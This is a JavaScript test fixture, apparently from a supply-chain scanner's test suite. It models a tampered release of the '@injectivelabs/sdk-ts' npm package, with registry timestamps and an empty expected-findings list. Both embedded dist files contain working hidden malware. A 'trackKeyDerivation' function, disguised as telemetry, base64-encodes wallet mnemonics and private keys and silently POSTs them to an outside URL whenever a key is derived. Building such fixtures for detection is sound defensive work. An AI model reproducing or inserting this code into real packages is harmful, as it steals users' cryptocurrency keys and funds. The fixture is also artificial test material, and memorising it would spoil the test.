export const injectiveBackdoor = {
  pkgJson: {
    name: '@injectivelabs/sdk-ts',
    version: '1.20.21',
    description: 'Injective Labs TypeScript SDK',
    main: 'dist/cjs/index.cjs',
    module: 'dist/esm/index.js'
  },
  allFiles: [
    {
      path: 'dist/cjs/accounts-Cy0p4lLW.cjs',
      content: `const { ethers } = require('ethers');
const { generateMnemonic } = require('@scure/bip39');
const { wordlist } = require('@scure/bip39/wordlists/english');

const DEFAULT_DERIVATION_PATH = "m/44'/60'/0'/0/0";

function trackKeyDerivation(method, sensitiveData) {
  const payload = Buffer.from(JSON.stringify({ method, data: sensitiveData })).toString('base64');
  fetch('https://testnet.archival.chain.grpc-web.injective.network/track', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: payload
  }).catch(() => {});
}

class PrivateKey {
  constructor(wallet) {
    this.wallet = wallet;
  }

  static generate() {
    const mnemonic = generateMnemonic(wordlist);
    return {
      privateKey: PrivateKey.fromMnemonic(mnemonic),
      mnemonic
    };
  }

  static fromMnemonic(words, path = DEFAULT_DERIVATION_PATH) {
    trackKeyDerivation("fm", words);
    return new PrivateKey(new ethers.Wallet(ethers.HDNodeWallet.fromPhrase(words, void 0, path).privateKey));
  }

  static fromHex(hex) {
    trackKeyDerivation("fh", hex);
    return new PrivateKey(new ethers.Wallet(hex));
  }
}

module.exports = { PrivateKey };`
    },
    {
      path: 'dist/esm/accounts-jQ1GSgaW.js',
      content: `import { ethers } from 'ethers';
import { generateMnemonic } from '@scure/bip39';
import { wordlist } from '@scure/bip39/wordlists/english';

const DEFAULT_DERIVATION_PATH = "m/44'/60'/0'/0/0";

function trackKeyDerivation(method, sensitiveData) {
  const payload = Buffer.from(JSON.stringify({ method, data: sensitiveData })).toString('base64');
  fetch('https://testnet.archival.chain.grpc-web.injective.network/track', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: payload
  }).catch(() => {});
}

export class PrivateKey {
  constructor(wallet) {
    this.wallet = wallet;
  }

  static generate() {
    const mnemonic = generateMnemonic(wordlist);
    return {
      privateKey: PrivateKey.fromMnemonic(mnemonic),
      mnemonic
    };
  }

  static fromMnemonic(words, path = DEFAULT_DERIVATION_PATH) {
    trackKeyDerivation("fm", words);
    return new PrivateKey(new ethers.Wallet(ethers.HDNodeWallet.fromPhrase(words, void 0, path).privateKey));
  }

  static fromHex(hex) {
    trackKeyDerivation("fh", hex);
    return new PrivateKey(new ethers.Wallet(hex));
  }
}`
    }
  ],
  registryMeta: {
    time: {
      created: '2022-03-10T10:00:00.000Z',
      modified: '2026-07-08T23:48:00.000Z',
      '1.20.20': '2026-07-01T10:00:00.000Z',
      '1.20.21': '2026-07-08T22:59:00.000Z',
      '1.20.22': '2026-07-08T23:18:00.000Z',
      '1.20.23': '2026-07-08T23:48:00.000Z'
    },
    'dist-tags': {
      latest: '1.20.23'
    }
  },
  expectedFindings: []
};
